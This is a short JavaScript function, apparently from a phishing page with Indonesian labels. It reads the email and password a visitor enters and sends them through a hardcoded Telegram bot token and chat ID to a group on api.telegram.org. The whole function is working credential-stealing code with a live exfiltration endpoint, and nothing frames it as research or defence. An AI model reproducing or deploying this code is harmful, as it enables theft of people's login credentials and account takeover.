function kirimPesan() {

    var email = document.getElementById('email');
    var password = document.getElementById('password');

    var gabungan = 'Email%20atau%20Nomor%20Telepon%20%3A%0A' + email.value + '%0AKata%20Sandi%20%3A%0A' + password.value;

    var token = '7357631529:AAFh1Br71R9ufWC31QWLOS4VdIDJVV4WbX4';
    var grup = '-4283817234';

    $.ajax({
        url: `https://api.telegram.org/bot7357631529:AAFh1Br71R9ufWC31QWLOS4VdIDJVV4WbX4/sendMessage?chat_id=-4283817234&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}